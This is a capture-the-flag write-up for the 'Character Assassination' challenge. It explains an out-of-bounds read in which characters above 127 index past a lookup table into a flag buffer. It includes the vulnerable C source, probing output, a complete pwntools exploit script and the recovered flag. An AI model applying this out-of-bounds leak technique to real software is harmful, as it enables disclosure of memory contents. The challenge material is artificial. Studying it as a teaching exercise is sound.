# Character Assassination
## Solution

For this challenge, we are given the source code of the binary and the binary itself , [character-assassination](./character_assassination).
Running the binary, we see that it forces every odd indexed character lowercase and every even indexed character uppercase, when starting the index at 1.

```
character asssassination$ ./character_assassination
> AAAAAAAAAAAAAAAAA
aAaAaAaAaAaAaAaAa
```

Looking at the source code, we see that it does this with two arrays lower[] and upper[]. We can also see that flag is stored in an array just before upper[].

```c
char flag[64] = "bctf{fake_flag}";
char upper[] = {
    '?',  '?',  '?', '?', '?', '?', '?', '?', '?', '\t', '\n', '\x0b', '\x0c',
    '\r', '?',  '?', '?', '?', '?', '?', '?', '?', '?',  '?',  '?',    '?',
    '?',  '?',  '?', '?', '?', '?', ' ', '!', '"', '#',  '$',  '%',    '&',
    '\'', '(',  ')', '*', '+', ',', '-', '.', '/', '0',  '1',  '2',    '3',
    '4',  '5',  '6', '7', '8', '9', ':', ';', '<', '=',  '>',  '?',    '@',
    'A',  'B',  'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',  'K',  'L',    'M',
    'N',  'O',  'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',  'X',  'Y',    'Z',
    '[',  '\\', ']', '^', '_', '`', 'A', 'B', 'C', 'D',  'E',  'F',    'G',
    'H',  'I',  'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q',  'R',  'S',    'T',
    'U',  'V',  'W', 'X', 'Y', 'Z', '{', '|', '}', '~',
};
char lower[] = {
    '?',  '?',  '?', '?', '?', '?', '?', '?', '?', '\t', '\n', '\x0b', '\x0c',
    '\r', '?',  '?', '?', '?', '?', '?', '?', '?', '?',  '?',  '?',    '?',
    '?',  '?',  '?', '?', '?', '?', ' ', '!', '"', '#',  '$',  '%',    '&',
    '\'', '(',  ')', '*', '+', ',', '-', '.', '/', '0',  '1',  '2',    '3',
    '4',  '5',  '6', '7', '8', '9', ':', ';', '<', '=',  '>',  '?',    '@',
    'a',  'b',  'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',  'k',  'l',    'm',
    'n',  'o',  'p', 'q', 'r', 's', 't', 'u', 'v', 'w',  'x',  'y',    'z',
    '[',  '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd',  'e',  'f',    'g',
    'h',  'i',  'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',  'r',  's',    't',
    'u',  'v',  'w', 'x', 'y', 'z', '{', '|', '}', '~',
};
```

In main, there is a for loop that uses the value of each character (e.g. 0x61 for 'a') as the index for each array. 

```c
char input[256];

  while (1) {
    printf("> ");
    if (!fgets(input, sizeof(input), stdin)) {
      break;
    }
    for (int i = 0; i < sizeof(input) && input[i]; i++) {
      char c = input[i];
      if (i % 2) {
        printf("%c", upper[c]);
      } else {
        printf("%c", lower[c]);
      }
    }
    printf("\n");
  }
```

However, each array is only 127 bytes long, and the max value a byte can be is 255. Therefore, we can read values out of the array bounds by giving it chars that, when converted into an integer, has a value greater than about 127.

Doing this shows us that when reading out of bounds for lower[], those being the first, third, fifth, seventh, and so on characters, we end up read values in upper[]
```py
for i in range(192,256):
    io.sendline(chr(i))
    print(io.recvline())
```
```
> `

> A

> B

> C

> D

> E

> F

> G

> H

> I

> J

> K

> L

> M

> N

> O

> P

> Q

> R

> S

> T

> U

> V

> W

> X

> Y

> Z

> {

> |

> }

> ~

> \x00
```

However, doing this with upper, such as the second character of our input, starts reading flag values. Thus, we can just make a loop and read the whole value of the flag like this.

## Script

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=character-assassination.challs.pwnoh.io' '--port=1337'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './character_assassination'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'character-assassination.challs.pwnoh.io'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
flag = []
for i in range(192,256):
    io.sendline('a' + chr(i))
    recieve = io.recvline().decode()
    io.recvline()
    try:
        flag.append(recieve[3])
    except:
        continue

print("".join(flag))

io.interactive()


```

## Flag
`Flag: bctf{wOw_YoU_sOlVeD_iT_665ff83d}`